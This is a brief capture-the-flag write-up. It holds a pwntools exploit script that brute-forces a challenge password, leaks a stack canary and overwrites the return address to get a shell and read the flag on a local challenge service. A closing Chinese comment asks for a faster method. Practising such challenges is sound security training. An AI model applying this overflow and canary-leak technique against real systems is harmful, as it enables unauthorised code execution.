# Catch_the_canary!

```py
from pwn import *
context.arch="amd64"
def exp():
    p=remote("127.0.0.1","56249")
    p.recvuntil("[Info] Password required.\n")
    for i in range(0x2345):
        p.sendline(str(i+0xffdcba))
        if b"[Error]" not in p.recvline():
            print(f"{i=}")
            break
    for i in range(2):
        p.sendline("-")
    p.sendline("195874819")
    payload='a'*0x18
    p.sendlineafter("p it!\n",payload)
    p.recvuntil(payload+'\n')
    canary=u64(p.recv(7).rjust(8,b'\x00'))
    p.sendline(b'a'*0x18+p64(canary)+p64(0)+p64(0x004012c9))
    p.sendline("cat flag")
    print(p.recvlines(2))
while True:
    try:
        exp()
    except:
        pass
```
太痛苦了，我这个做法需要在有alarm的情况下爆破，需要老天赏饭吃……难道说还有别的方法可以快点？